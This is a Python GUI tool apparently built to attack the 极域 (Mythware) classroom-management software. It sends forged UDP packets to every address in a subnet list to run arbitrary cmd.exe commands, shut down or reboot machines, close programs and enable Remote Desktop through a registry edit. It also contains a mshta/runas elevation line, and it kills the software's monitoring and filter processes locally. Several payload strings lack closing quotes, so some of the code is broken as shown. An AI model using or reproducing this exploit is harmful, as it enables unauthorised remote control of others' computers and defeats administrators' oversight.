import tkinter as tk
import socket

# 发送消息函数    ipconfig  IP桥段
def send_message():
    bb = comboxlist_1.get()
    if bb == '2010版本':
        port=4605
    elif bb == '2015版本':
        port=4705
    elif bb == '2016版本':
        port=4705
    elif bb == '2021版本':
        port=4988
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bian = data.get().encode('unicode-escape')
    ack =str(bian)
    ack = ack.split(r'\\u')
    del ack[0]
    send_payload = ""
    for i in ack:
        send_payload += i[2] + i[3] + i[0] + i[1]
        payload = f'444d4f43000001009e030000dc79fabb169ec04ca009db380f7f34ee204e0000c0a803fe9103000091030000000800000000000005000000{send_payload}
    payload_bytes = bytes.fromhex(payload)
    f = open("host.txt", "r")
    lines = [line for line in f]
    for line in lines:
        ip = line.strip()
        print(ip)
        print(port)
        udp_socket.sendto(payload_bytes, (f"{ip}", port))
        print('消息已发送完成！')
    udp_socket.close()

# 发送命令函数
def send_cmd():
    bb = comboxlist_1.get()
    if bb == '2010版本':
        port = 4605
    elif bb == '2015版本':
        port = 4705
    elif bb == '2016版本':
        port = 4705
    elif bb == '2021版本':
        port = 4988
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s=cmd.get()
    s_hex = ""
    for i in range(len(s)):
        if i == ' ':
            s_hex += '20'
        s_hex = s_hex + hex(ord(s[i]))[2:] + "00"
    payload = f'444d4f43000001006e0300008e44dcfa94cc8a4ba5fffa49b0caa95f204e0000c0a81484610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002e0065007800650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002f006b002000{s_hex}
    payload_bytes = bytes.fromhex(payload)
    f = open("host.txt", "r")
    lines = [line for line in f]
    for line in lines:
        ip = line.strip()
        print(ip)
        udp_socket.sendto(payload_bytes, (f"{ip}", port))
        print('命令已发送完成！')
    udp_socket.close()

# 一键生成ip函数
def saomiao():
    zj_list =srip.get()
    qg_list = zj_list.split('.')
    for i in range(1,255):
        with open('host.txt', 'a') as f:
            yz_list = str(qg_list[0]),str(qg_list[1]),str(qg_list[2]),str(i)
            ip_list = ''
            ip_list = yz_list[0]+'.'+yz_list[1]+'.'+yz_list[2]+'.'+yz_list[3]
            f.write(ip_list+'\n')
        f.close()
    import tkinter.messagebox
    tkinter.messagebox.showinfo('一键生成', '生成完成！已在当前目录下创建host.txt文件！')

#菜单栏 检查更新
def jcgx():
    import tkinter.messagebox
    tkinter.messagebox.showinfo('检查更新', 'Baugle')

#菜单栏 联系作者
def lxzz():
    import tkinter.messagebox
    tkinter.messagebox.showinfo('联系作者', 'Baugle')

#菜单栏 使用说明
def sysm():
    import tkinter.messagebox
    tkinter.messagebox.showinfo('使用说明', '请在此目录下创建一个host.txt文件存放目标ip！一键生成只支持24位掩码！一行一个，不要有空格!每个模块15秒可执行一次！')

#菜单栏 关于
def gy():
    import tkinter.messagebox
    tkinter.messagebox.showinfo('关于', '此软件在GitHub开源')

# 开启远程桌面函数
def kq_yczm():
    bb = comboxlist_1.get()
    if bb == '2010版本':
        port = 4605
    elif bb == '2015版本':
        port = 4705
    elif bb == '2016版本':
        port = 4705
    elif bb == '2021版本':
        port = 4988
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s = '''REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD  /d  0  /f'''
    s_hex = ""
    for i in range(len(s)):
        if i == ' ':
            s_hex += '20'
        s_hex = s_hex + hex(ord(s[i]))[2:] + "00"
    payload = f'444d4f43000001006e0300008e44dcfa94cc8a4ba5fffa49b0caa95f204e0000c0a81484610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002ef006b002000{s_hex}
    payload_bytes = bytes.fromhex(payload)
    f = open("host.txt", "r")
    lines = [line for line in f]
    for line in lines:
        ip = line.strip()
        print(ip)
        udp_socket.sendto(payload_bytes, (f"{ip}", port))
        print('命令已发送完成！')

# 关闭极域函数
def lx_kfz():
    bb = comboxlist_1.get()
    if bb == '2010版本':
        port = 4605
    elif bb == '2015版本':
        port = 4705
    elif bb == '2016版本':
        port = 4705
    elif bb == '2021版本':
        port = 4988
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s = '''%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit cd /d "%~dp0"
@echo off
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD  /d  0  /f'''
    s_hex = ""

    for i in range(len(s)):
        if i == ' ':
            s_hex += '20'
        s_hex = s_hex + hex(ord(s[i]))[2:] + "00"
    payload = f'444d4f43000001006e0300008e44dcfa94cc8a4ba5fffa49b0caa95f204e0000c0a81484610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002ef006b002000{s_hex}
    payload_bytes = bytes.fromhex(payload)
    f = open("host.txt", "r")
    lines = [line for line in f]
    for line in lines:
        ip = line.strip()
        print(ip)
        udp_socket.sendto(payload_bytes, (f"{ip}", port))
        print('命令已发送完成！')

#操作指令函数
def send_hack():
    bb = comboxlist_1.get()
    if bb == '2010版本':
        port = 4605
    elif bb == '2015版本':
        port = 4705
    elif bb == '2016版本':
        port = 4705
    elif bb == '2021版本':
        port = 4988
    dos = comboxlist.get()
    if dos == '打开记事本':
        payload = "444d4f43000001006e030000d105ef0f2ea4524fa811eb311b859236204e0000c0a803fe610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c004e004f00540045005000410044002e0045005800450000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000"
    elif dos == '关机':
        payload = "444d4f43000001002a020000ae405669f33bab44b41006b4ee978d2b204e0000c0a803fe1d0200001d0200000002000000000000140000100f00000001000000000000005965085e065c7351ed95a8608476a18b977b3a
    elif dos == '强制重启':
        payload = "444d4f43000001002a02000041d71dd603610f4db08d89c5aaa2b501204e0000c0a814841d0200001d0200000002000000000000130000100f00000001000000000000005965085e065ccd912f54a8608476a18b977b3a
    elif dos == '提示重启':
        payload = "444d4f43000001002a02000022a5fc1805afff4680b30072ccdbdd41204e0000c0a814841d0200001d0200000002000000000000130000000f0000000100000000000000d19ea25b065ccd912f54a8608476a18b977b3a
    elif dos == '关闭所有应用程序':
        payload = '444d4f43000001002a020000219362685cfc1743846d5cc258953aa9204e0000c0a814841d0200001d0200000002000000000000020000000f0000000100000000000000d19ea25b065c7351ed95a8608476945e28750b7a8f5e
    elif dos==  '开启远程桌面':
        kq_yczm()
    elif dos =='关闭极域':
        lx_kfz()
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload_bytes = bytes.fromhex(payload)
    f = open("host.txt", "r")
    lines = [line for line in f]
    for line in lines:
        ip = line.strip()
        print(ip)
        udp_socket.sendto(payload_bytes, (f"{ip}", port))
        print('命令执行完成！')
    udp_socket.close()

#解除U盘和网页限制
def jc_xz():
    import os
    print(os.system('sc stop tdnetfilter'))
    print(os.system('taskkill /f /t /im  GATESRV.exe'))
    print(os.system('taskkill /f /t /im  MasterHelper'))
    import tkinter.messagebox
    tkinter.messagebox.showinfo('解除限制', 'U盘和网页限制已解除！')

port = 0
root = tk.Tk()
root.title("极域控制器Baugle")  # 窗口标题
root.geometry("650x495+550+280")  # 第一个值为窗口内部至左边框的距离，第二个参数为上边框至下部的距离，第三个参数为左边边框与屏幕的距离，第四个参数为上边框与屏幕的距离
tishi_1 = tk.Label(root, text='Hello,world', bg='blue', fg='red', font=('黑体', 30)).place(x=60, y=15)
#菜单栏
f = tk.Menu(root)
root['menu']=f
f.add_command(label='联系作者',command=lxzz)
f.add_command(label='使用说明',command=sysm)
f.add_command(label='检查更新',command=jcgx)
f.add_command(label='关于',command=gy)

# 操作功能选项区域
from tkinter import ttk
comvalue=tk.StringVar()#窗体自带的文本，新建一个值
comboxlist=ttk.Combobox(root,textvariable=comvalue) #初始化
comboxlist["values"]=("打开记事本","关机","强制重启","提示重启","关闭所有应用程序","关闭极域","开启远程桌面")
comboxlist.set('请选择需要的操作')
comboxlist.place(x=60,y=90)

queren = tk.Button(root,text='执行',font=('楷体',30),fg='green',command=send_hack).place(x=460,y=70)


tishi_5 = tk.Label(root, text='2021版不支持关闭极域！', bg='blue', fg='red', font=('黑体',12)).place(x=260, y=120)
# 版本选择区域
p=tk.IntVar()#窗体自带的文本，新建一个值
comboxlist_1=ttk.Combobox(root,textvariable=p) #初始化
comboxlist_1["values"]=("2010版本","2015版本","2016版本","2021版本",)
comboxlist_1.set('请选择版本')
comboxlist_1.place(x=270,y=90)


# 一键扫描
srip = tk.StringVar()
tk.Label(root, text='请输入生成的网段(192.168.20.0/24)',font=('楷体',18),fg='blue').place(x=15,y=150)
send_ml = tk.Entry(root, show=None,textvariable=srip,font=('楷体', 16)).place(x=20, y=190,height=40,width=200)

saomiao = tk.Button(root,text='一键生成',font=('楷体',24),fg='red',command=saomiao).place(x=240,y=181)

# 一键关闭U盘和网页限制
jiechu_xz = tk.Button(root,text='解除U盘和网页限制',font=('楷体',18),fg='red',command=jc_xz).place(x=410,y=190)

# 发送消息区域
data = tk.StringVar()
tk.Label(root, text='发送信息模块(仅支持中文)：',font=('楷体',18),fg='blue').place(x=30,y=245)
tk.Label(root, text='2010版不支持！',font=('楷体',18),fg='blue').place(x=90,y=280)
send_data = tk.Entry(root, show=None,textvariable=data,font=('楷体', 18)).place(x=55, y=320,height=80,width=220)
send = tk.Button(root,text='发送',font=('楷体',30),fg='green',command=send_message).place(x=110,y=410)

# 系统命令区域
cmd = tk.StringVar()
tk.Label(root, text='系统命令模块：',font=('楷体',18),fg='blue').place(x=340,y=280)
send_ml = tk.Entry(root, show=None,textvariable=cmd,font=('楷体', 18)).place(x=340, y=320,height=80,width=258)
send_2 = tk.Button(root,text='发送',font=('楷体',30),fg='green',command=send_cmd).place(x=415,y=410)

root.mainloop()
